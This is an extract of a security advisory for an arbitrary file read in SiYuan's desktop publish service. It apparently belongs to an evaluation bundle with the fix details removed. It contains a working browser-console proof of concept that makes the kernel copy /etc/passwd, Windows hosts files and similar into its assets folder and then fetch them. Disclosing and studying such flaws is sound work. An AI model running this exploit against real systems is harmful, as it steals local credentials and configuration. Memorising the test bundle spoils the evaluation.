# Advisory factual evidence — GHSA-fq2j-j8hc-8vw8

Mechanical, fact-only extract for adjudication. Fix-attribution lines are removed (logged
below); no hand paraphrase. The fix diff is supplied separately, not here.

- Advisory: GHSA-fq2j-j8hc-8vw8  (aliases: CVE-2026-32938, GO-2026-4722)
- Affected package: Go: github.com/siyuan-note/siyuan/kernel
- Severity: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:H
- Published: 2026-03-17T14:07:57Z
- Summary: SiYuan Vulnerable to Arbitrary File Read in Desktop Publish Service
- Source: https://github.com/siyuan-note/siyuan/security/advisories/GHSA-fq2j-j8hc-8vw8

## Details (verbatim, fix-attribution lines removed)

### Summary

In SiYuan, `/api/lute/html2BlockDOM` on the desktop copies local files pointed to by `file://` links in pasted HTML into the workspace assets directory without validating paths against a sensitive-path list. Together with `GET /assets/*path`, which only requires authentication, a publish-service visitor can cause the desktop kernel to copy any readable sensitive file and then read it via GET, leading to exfiltration of sensitive files.

### Details

#### 1. Arbitrary local files copied into workspace

- **Endpoint**: `POST /api/lute/html2BlockDOM`, protected only by `model.CheckAuth`; publish read-only role is not restricted.
- **Behavior**: On desktop (`util.ContainerStd == model.Conf.System.Container`), local absolute paths from `<a href="file://...">` in the HTML are copied to `{DataDir}/assets/`.

#### 2. Direct access to assets via GET

- **Endpoint**: `GET /assets/*path` (`kernel/server/serve.go`), protected only by `model.CheckAuth`; no publish-scope or admin check.
- **Attack chain**: The visitor calls html2BlockDOM to copy a sensitive file into `data/assets/`, extracts `data-href="assets/xxx"` from the returned DOM, then requests `GET /assets/xxx` to retrieve the file content.

### PoC

```javascript
// Run in the browser devtools console while on the SiYuan publish service
(async () => {
  try {
    const sensitiveFiles = [
      'file:///etc/passwd',
      'file:///etc/group',
      'file:///C:/Windows/System32/drivers/etc/hosts',
      'file:///C:/Windows/System32/drivers/etc/services',
    ];
    const dom = '<p>' + sensitiveFiles.map(f => `<a href="${f}">x</a>`).join(' ') + '</p>';
    const r1 = await fetch('/api/lute/html2BlockDOM', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ dom }),
      credentials: 'same-origin',
    });
    const { data } = await r1.json();
    const paths = [...(data || '').matchAll(/data-href="(assets\/[^"]+)"/g)].map(m => m[1]);
    for (const p of paths) {
      const r2 = await fetch('/' + p, { credentials: 'same-origin' });
      if (r2.ok) console.log('--- ' + p + ' ---\n' + (await r2.text()));
    }
  } catch (_) {}
})();
```

### Impact

With only normal authentication, an attacker can bypass intended directory restrictions and read any sensitive file that the process can read on the desktop user’s machine (e.g. system account data, network configuration, credential configs), compromising confidentiality of sensitive data and the runtime environment.

## References (fix-commit excluded)
- WEB: https://github.com/siyuan-note/siyuan/security/advisories/GHSA-fq2j-j8hc-8vw8
- ADVISORY: https://nvd.nist.gov/vuln/detail/CVE-2026-32938
- PACKAGE: https://github.com/siyuan-note/siyuan
- WEB: https://github.com/siyuan-note/siyuan/releases/tag/v3.6.1

## Redaction note
- 3 fix-attribution line(s) and 1 fix-locating reference(s) were removed so this evidence carries the vulnerability facts without the remediation answer.
- The verbatim removed lines are recorded author-side only (`advisory-redaction-log.md`), not in this judge bundle, to avoid leaking fix-attribution.
